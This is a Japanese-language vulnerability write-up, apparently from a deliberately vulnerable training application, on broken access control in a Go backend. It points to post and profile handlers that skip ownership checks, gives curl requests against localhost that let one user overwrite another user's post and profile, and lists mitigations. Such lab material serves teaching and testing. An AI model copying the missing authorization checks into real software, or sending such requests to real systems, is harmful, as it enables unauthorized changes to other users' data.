# アクセス制御の不備

## 脆弱性の説明
アクセス制御の不備により、ユーザーが本来アクセスできないはずのリソースや
機能にアクセスできてしまう脆弱性です。

## 実装箇所
1. 投稿の編集・削除 (`backend/internal/handlers/post.go`)
```go
func (h *PostHandler) UpdatePost(c *gin.Context) {
    // ユーザー所有権の検証が不十分
    postID := c.Param("id")
    // ...
}
```

2. プロフィール更新 (`backend/internal/handlers/auth.go`)
```go
func (h *AuthHandler) UpdateProfile(c *gin.Context) {
    // ユーザー認証の検証が不十分
    userID := c.GetString("user_id")
    // ...
}
```

## 確認手順

### 投稿の不正編集
1. ユーザーAでログイン
2. ユーザーBの投稿IDを取得
3. 以下のようなリクエストを送信:
```bash
curl -X PUT -H "Content-Type: application/json" \
     -H "Authorization: <ユーザーAのトークン>" \
     -d '{"content":"Hacked!"}' \
     http://localhost:9090/api/posts/<ユーザーBの投稿ID>
```
4. ユーザーBの投稿が更新されることを確認

### プロフィールの不正更新
1. ユーザーAでログイン
2. 以下のようなリクエストを送信:
```bash
curl -X PUT -H "Content-Type: application/json" \
     -H "Authorization: <ユーザーAのトークン>" \
     -d '{"id":"user_b","nickname":"Hacked!"}' \
     http://localhost:9090/api/profile
```
3. ユーザーBのプロフィールが更新されることを確認

## 対策方法
1. 適切な認可チェックの実装
2. リソース所有権の検証
3. ロールベースのアクセス制御
4. セッション管理の強化
